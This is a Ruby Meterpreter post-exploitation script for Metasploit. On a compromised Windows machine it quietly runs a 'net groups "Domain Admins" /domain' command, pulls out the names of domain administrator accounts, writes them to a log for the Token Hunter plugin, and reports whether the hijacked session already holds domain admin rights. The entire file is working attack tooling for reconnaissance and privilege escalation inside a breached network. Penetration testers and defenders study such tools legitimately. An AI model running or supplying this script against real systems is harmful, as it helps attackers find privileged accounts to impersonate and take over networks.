#$Id:$
#Meterpreter script for generating domain admin list to be used with Token Hunter plugin
#Provided by Carlos Perez at carlos_perez[at]darkoperator[dot]com
#Verion: 0.1
#-------------------------------------------------------------------------------
#Options and Option Parsing
opts = Rex::Parser::Arguments.new(
	"-h" => [ false, "Help menu." ]
)

opts.parse(args) { |opt, idx, val|
	case opt
	when "-h"
		print_line "Meterpreter Script for extracting Doamin Admin Account list for use."
		print_line "in token_hunter plugin and verifies if current account for session is"
		print_line "is a member of such group."
		print_line(opts.usage)
		raise Rex::Script::Completed
	end
}
#-------------------------------------------------------------------------------
#Set General Variables used in the script
@client =  client
users = ""
list = []
host = @client.sys.config.sysinfo['Computer']
current_user = client.sys.config.getuid.scan(/\S*\\(.*)/)
domain = @client.fs.file.expand_path("%USERDOMAIN%")
# Create Filename info to be appended to downloaded files
filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")+"-"+sprintf("%.5d",rand(100000))
# Create a directory for the logs
logs = ::File.join(Msf::Config.log_directory, 'domain_admins', host + filenameinfo )
# Create the log directory
::FileUtils.mkdir_p(logs)
#logfile name
dest = logs + "/" + host + filenameinfo + ".txt"
print_status("found users will be saved to #{dest}")
#-------------------------------------------------------------------------------
# Function for writing results of other functions to a file
def filewrt(file2wrt, data2wrt)
	output = ::File.open(file2wrt, "a")
	if data2wrt
		data2wrt.each_line do |d|
			output.puts(d)
		end
	end
	output.close
end
################## MAIN ##################
#Run net command to enumerate users and verify that it ran successfully
cmd = 'net groups "Domain Admins" /domain'
r = @client.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
while(d = r.channel.read)
	users << d
	if d=~/System error/
		print_error("Could not enumerate Domain Admins!")
		raise Rex::Script::Completed
	end
end
#split output in to lines
out_lines = users.split("\n")
#Select only those lines that have the usernames
a_size = (out_lines.length - 8)
domadmins = out_lines.slice(6,a_size)
#get only the usernames out of those lines
domainadmin_user_list = []
domadmins.each do |d|
	d.split("  ").compact.each do |s|
		domainadmin_user_list << s.strip if s.strip != ""
	end
end

#process accounts found
print_status("Accounts Found:")
domainadmin_user_list.each do |u|
	print_status("\t#{domain}\\#{u}")
	filewrt(dest, "#{domain}\\#{u}")
	list << u
end
if list.index(current_user.join.chomp)
	print_status("Current sessions running as #{domain}\\#{current_user.join.chomp} is a Domain Admin!!")
else
	print_error("Current session running as #{domain}\\#{current_user.join.chomp} is not running as Domain Admin")
end
